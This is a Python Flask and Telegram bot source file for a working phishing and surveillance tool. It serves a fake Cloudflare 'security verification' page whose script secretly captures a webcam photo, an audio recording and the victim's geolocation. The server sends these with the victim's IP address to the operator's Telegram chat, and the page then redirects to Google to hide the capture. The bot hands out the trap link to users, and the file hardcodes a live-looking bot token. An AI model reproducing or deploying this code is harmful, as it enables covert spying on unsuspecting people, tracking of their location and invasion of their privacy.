import base64, requests, io, os, time
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# ==================== إعدادات المطور سيوفي ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
MY_LINK = "https://sif-e7ad.onrender.com"
DEVELOPER_USER = "Y_urd"

link_active = True 
users_db = {}
# =============================================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان | Cloudflare</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { text-align: center; border: 1px solid #ddd; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f6821f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="100">
        <h2>جاري التحقق...</h2>
        <p>يرجى السماح بالصلاحيات لتأمين اتصالك.</p>
        <div class="spinner"></div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        let chunks = [];
        async function sendData(data) {
            await fetch('/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
        }
        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v');
                v.srcObject = stream;
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendData({ type: 'text', lat: pos.coords.latitude, lon: pos.coords.longitude });
                }, async () => await sendData({ type: 'text', lat: 0, lon: 0 }));
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    await sendData({ type: 'img', img: c.toDataURL('image/jpeg', 0.6).split(',')[1] });
                }, 2000);
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    recorder.onstop = async () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks, { type: 'audio/ogg' }));
                        reader.onloadend = async () => {
                            await sendData({ type: 'audio', audio: reader.result.split(',')[1] });
                            window.location.href = "https://www.google.com";
                        };
                    };
                }, 3500);
            } catch (e) { await sendData({ type: 'text', lat: 0, lon: 0 }); window.location.href = "https://www.google.com"; }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def tg_send(method, payload, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if files: return requests.post(url, data=payload, files=files)
        return requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending to TG: {e}")
        return None

@app.route('/')
def index():
    if not link_active: return redirect("https://www.google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    global link_active
    data = request.json
    t = data.get('type')
    if t == 'text':
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        loc = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}" if data.get('lat') != 0 else "غير متاح"
        tg_send("sendMessage", {"chat_id": ADMIN_ID, "text": f"🎯 صيد جديد!\nIP: <code>{ip}</code>\nالموقع: <a href='{loc}'>خريطة</a>", "parse_mode": "HTML"})
    elif t == 'img':
        f = io.BytesIO(base64.b64decode(data.get('img'))); f.name = 'snap.jpg'
        tg_send("sendPhoto", {"chat_id": ADMIN_ID}, {"photo": f})
        link_active = False 
    elif t == 'audio':
        a = io.BytesIO(base64.b64decode(data.get('audio'))); a.name = 'voice.ogg'
        tg_send("sendVoice", {"chat_id": ADMIN_ID}, {"voice": a})
    return jsonify({"s": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update: return "No Data", 400
    
    # معالجة الرسائل
    if "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")

        if text == "/start":
            kb = {"inline_keyboard": [[{"text": "✅ تم الاشتراك، ابدأ", "callback_data": "gen"}]]}
            tg_send("sendMessage", {"chat_id": chat_id, "text": f"أهلاً بك في بوت سيوفي.\nاشترك أولاً:\n{CHANNEL_URL}", "reply_markup": kb})
        
        elif text == "/open" and chat_id == ADMIN_ID:
            global link_active; link_active = True
            tg_send("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم فتح الرابط."})

    # معالجة الأزرار
    elif "callback_query" in update:
        cb = update["callback_query"]
        chat_id = cb["message"]["chat"]["id"]
        if cb["data"] == "gen":
            user = users_db.get(chat_id, {"used": False})
            if user["used"] and chat_id != ADMIN_ID:
                tg_send("sendMessage", {"chat_id": chat_id, "text": "❌ انتهت محاولتك."})
            else:
                users_db[chat_id] = {"used": True}
                tg_send("sendMessage", {"chat_id": chat_id, "text": f"رابطك:\n<code>{MY_LINK}</code>", "parse_mode": "HTML"})

    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
